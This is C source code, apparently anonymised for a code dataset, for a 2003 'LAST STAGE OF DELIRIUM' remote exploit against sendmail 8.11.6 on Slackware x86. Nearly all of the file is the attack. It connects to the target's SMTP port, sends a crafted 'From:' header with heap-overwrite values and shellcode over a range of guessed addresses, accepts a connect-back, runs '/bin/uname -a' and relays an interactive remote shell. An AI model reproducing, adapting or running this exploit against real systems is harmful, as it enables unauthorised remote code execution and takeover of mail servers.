
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


struct timeval {int tv_sec; scalar_t__ tv_usec; } ;
struct TYPE_2__ {int s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; void* sin_port; void* sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {int h_addr; } ;
typedef int fd_set ;
typedef int address ;


 void* VAR_0 ;
 int FUNC_0 (int,int) ;
 scalar_t__ VAR_1 ;
 scalar_t__ VAR_2 ;
 scalar_t__ FUNC_1 (int,int *) ;
 int FUNC_2 (int,int *) ;
 int FUNC_3 (int *) ;
 int FUNC_4 (int) ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int VAR_6 ;
 int VAR_7 ;
 int VAR_8 ;
 int VAR_9 ;
 int VAR_10 ;
 int FUNC_5 (int,struct sockaddr*,int*) ;
 int FUNC_6 (char*) ;
 int FUNC_7 (int,struct sockaddr*,int) ;
 int FUNC_8 (struct sockaddr_in*,int) ;
 int FUNC_9 (int) ;
 int FUNC_10 (int,struct sockaddr*,int) ;
 scalar_t__ VAR_11 ;
 int FUNC_11 (int) ;
 int FUNC_12 (int ) ;
 int FUNC_13 (int,int,int) ;
 int FUNC_14 (int,int,int,int) ;
 int FUNC_15 (int) ;
 int FUNC_16 (int ) ;
 struct hostent* FUNC_17 (char*) ;
 int FUNC_18 (int,char**,char*) ;
 void* FUNC_19 (int) ;
 int FUNC_20 (char*) ;
 int FUNC_21 (char*,int) ;
 int FUNC_22 () ;
 int FUNC_23 (int,int) ;
 int VAR_12 ;
 int FUNC_24 (int*,int ,int) ;
 int FUNC_25 (char*,int ,int) ;
 char* VAR_13 ;
 int FUNC_26 (char*,...) ;
 int FUNC_27 (char*,int) ;
 int FUNC_28 (int,char*,int) ;
 scalar_t__ FUNC_29 (int,int *,int *,int *,struct timeval*) ;
 int FUNC_30 (int,char*,int ) ;
 int * VAR_14 ;
 int FUNC_31 (void*,int ,int ) ;
 int FUNC_32 (char*,char*,char*) ;
 int FUNC_33 (char*,char*,int*) ;
 int VAR_15 ;
 int FUNC_34 (int *) ;
 int FUNC_35 (int) ;
 int FUNC_36 (int,char*,int) ;

int FUNC_37(int VAR_16,char **VAR_17){
    int VAR_18,VAR_19,VAR_20,VAR_21,VAR_22,VAR_23,VAR_24,VAR_25,VAR_26,VAR_27,VAR_28,VAR_29,VAR_30,VAR_31,VAR_32;
    int VAR_33,VAR_34,VAR_35,VAR_36,VAR_37,VAR_38,VAR_39,VAR_40=80,VAR_41=256,VAR_42=1,VAR_43=25;
    fd_set VAR_44;
    struct timeval VAR_45;
    struct sockaddr_in VAR_46;
    struct hostent *VAR_47;
    char VAR_48[4096],VAR_49[4096];
    char *VAR_50,*VAR_51,*VAR_52=((void*)0);

    FUNC_26("copyright LAST STAGE OF DELIRIUM mar 2003 poland //lsd-pl.net/\n");
    FUNC_26("sendmail 8.11.6 for Slackware 8.0 x86\n\n");

    if (VAR_16<3) {
     FUNC_26("usage: %s target [-l localaddr] [-b localport] [-p ptr] [-c count] [-t timeout] [-v 80]\n",VAR_17[0]);
     FUNC_11(-1);
    }

    while((VAR_33=FUNC_18(VAR_16-1,&VAR_17[1],"b:c:l:p:t:v:"))!=-1) {
     switch(VAR_33) {
      case 'b': VAR_43=FUNC_6(VAR_13);break;
      case 'c': VAR_41=FUNC_6(VAR_13);break;
      case 'l': VAR_52=VAR_13;break;
      case 't': VAR_42=FUNC_6(VAR_13);break;
      case 'v': VAR_40=FUNC_6(VAR_13);break;
      case 'p': FUNC_33(VAR_13,"%x",&VAR_4);
     }
    }

    VAR_51=VAR_17[1];

    VAR_19=FUNC_31(VAR_0,VAR_10,0);
    FUNC_8(&VAR_46,sizeof(VAR_46));
    VAR_46.sin_family=VAR_0;
    VAR_46.sin_port=FUNC_19(VAR_43);
    if (FUNC_7(VAR_19,(struct sockaddr*)&VAR_46,sizeof(VAR_46))==-1) {
     FUNC_26("error: bind\n");FUNC_11(-1);
    }
    if (FUNC_23(VAR_19,10)==-1) {
     FUNC_26("error: listen\n");FUNC_11(-1);
    }

    FUNC_21(VAR_52,VAR_43);

    for(VAR_38=0;VAR_38<VAR_41;VAR_38++,VAR_4+=VAR_22*4) {
     VAR_9=VAR_4;
     VAR_18=FUNC_31(VAR_0,VAR_10,0);
     FUNC_8(&VAR_46,sizeof(VAR_46));
     VAR_46.sin_family=VAR_0;
     VAR_46.sin_port=FUNC_19(25);
     if ((VAR_46.sin_addr.s_addr=FUNC_20(VAR_51))==-1) {
      if ((VAR_47=FUNC_17(VAR_51))==((void*)0)) {
       FUNC_26("error: address\n");FUNC_11(-1);
      }
      FUNC_24(&VAR_46.sin_addr.s_addr,VAR_47->h_addr,4);
     }
     if (FUNC_10(VAR_18,(struct sockaddr*)&VAR_46,sizeof(VAR_46))==-1) {
      FUNC_26("error: connect\n");FUNC_11(-1);
     }
     FUNC_22();

     FUNC_30(VAR_18,"helo yahoo.com\n",0);
     FUNC_30(VAR_18,"mail from: anonymous@yahoo.com\n",0);
     FUNC_30(VAR_18,"rcpt to: lp\n",0);
     FUNC_30(VAR_18,"data\n",0);

     VAR_24=FUNC_13(VAR_9,VAR_8*4,1);
     FUNC_0(VAR_24,VAR_8*4);
     VAR_27=FUNC_4(VAR_24);

     FUNC_26(".");FUNC_12(VAR_15);

     VAR_23=FUNC_13(VAR_9,FUNC_34(VAR_14)+VAR_8*4,1);
     FUNC_0(VAR_23,FUNC_34(VAR_14)+VAR_8*4);

     switch(VAR_40) {
      case 80: VAR_34=28;VAR_35=0x46;VAR_36=0x94;VAR_37=0x1c;break;
      default: FUNC_11(-1);
     }

     VAR_36-=8;

     VAR_50=VAR_48;
     for(VAR_20=0;VAR_20<138;VAR_20++) {
      *VAR_50++='<';*VAR_50++='>';
     }
     *VAR_50++='(';
     for(VAR_20=0;VAR_20<VAR_34;VAR_20++) *VAR_50++=VAR_5;
     *VAR_50++=')';
     *VAR_50++=0;

     FUNC_27(&VAR_48[VAR_7+VAR_34],VAR_27);
     FUNC_32(VAR_49,"From: %s\n",VAR_48);
     FUNC_30(VAR_18,VAR_49,0);
     FUNC_30(VAR_18,"Subject: hello\n",0);
     FUNC_25(VAR_49,VAR_5,VAR_3);
     VAR_49[VAR_3-2]='\n';
     VAR_49[VAR_3-1]=0;

     VAR_22=0;

     while(VAR_22<VAR_8) {
      VAR_28=VAR_27;
      VAR_29=FUNC_4(VAR_6);

      if (!(VAR_25=FUNC_15(VAR_28))) break;
      VAR_28=FUNC_4(VAR_25);
      if (!(VAR_26=FUNC_14(VAR_29,VAR_35,VAR_36,VAR_37))) break;
      VAR_29=FUNC_4(VAR_26);

      VAR_32=FUNC_4(VAR_23);
      while (!FUNC_35(VAR_32)) VAR_32+=4;

      FUNC_27(&VAR_49[VAR_24],VAR_28);
      FUNC_27(&VAR_49[VAR_25+0x24],VAR_27);
      FUNC_27(&VAR_49[VAR_25+0x28],VAR_27);
      FUNC_27(&VAR_49[VAR_25+0x18],VAR_29-VAR_36-VAR_37);

      FUNC_27(&VAR_49[VAR_26-VAR_36-VAR_37],0x01010101);
      FUNC_27(&VAR_49[VAR_26-VAR_36-VAR_37+VAR_35],0xfffffff8);

      FUNC_27(&VAR_49[VAR_26-VAR_37],VAR_29-VAR_37);
      FUNC_27(&VAR_49[VAR_26],VAR_32);

      VAR_24+=4;
      VAR_9-=4;
      VAR_22++;
     }

     VAR_50=&VAR_49[VAR_23+4*VAR_8];
      for(VAR_20=0;VAR_20<FUNC_34(VAR_14);VAR_20++) {
      *VAR_50++=VAR_14[VAR_20];
     }
     FUNC_30(VAR_18,VAR_49,0);
     FUNC_30(VAR_18,"\n",0);
     FUNC_30(VAR_18,".\n",0);
     FUNC_16(VAR_12);

     FUNC_3(&VAR_44);
     FUNC_2(0,&VAR_44);
     FUNC_2(VAR_19,&VAR_44);

     VAR_45.tv_sec=VAR_42;
     VAR_45.tv_usec=0;

     if (FUNC_29(VAR_19+1,&VAR_44,((void*)0),((void*)0),&VAR_45)>0) {
      FUNC_9(VAR_18);
      VAR_39=1;
      if ((VAR_18=FUNC_5(VAR_19,(struct sockaddr*)&VAR_46,&VAR_34))==-1) {
        FUNC_26("error: accept\n");FUNC_11(-1);
      }
      FUNC_9(VAR_19);

      FUNC_26("\nbase 0x%08x mcicache 0x%08x\n",VAR_9,VAR_27);

      FUNC_36(VAR_18,"/bin/uname -a\n",14);
     } else {
      FUNC_9(VAR_18);
      VAR_39=0;
     }

     while(VAR_39){
        FUNC_3(&VAR_44);
        FUNC_2(0,&VAR_44);
        FUNC_2(VAR_18,&VAR_44);
        if(FUNC_29(VAR_18+1,&VAR_44,((void*)0),((void*)0),((void*)0))){
            int VAR_53;
            char VAR_54[1024];
            if(FUNC_1(0,&VAR_44)){
                if((VAR_53=FUNC_28(0,VAR_54,1024))<1){
                    if(VAR_11==VAR_2||VAR_11==VAR_1) continue;
                     else {FUNC_26("koniec\n");FUNC_11(-1);}
                }
                FUNC_36(VAR_18,VAR_54,VAR_53);
            }
            if(FUNC_1(VAR_18,&VAR_44)){
                if((VAR_53=FUNC_28(VAR_18,VAR_54,1024))<1){
                     if(VAR_11==VAR_2||VAR_11==VAR_1) continue;
                     else {FUNC_26("koniec\n");FUNC_11(-1);}
                }
                FUNC_36(1,VAR_54,VAR_53);
            }
        }
    }
  }
}
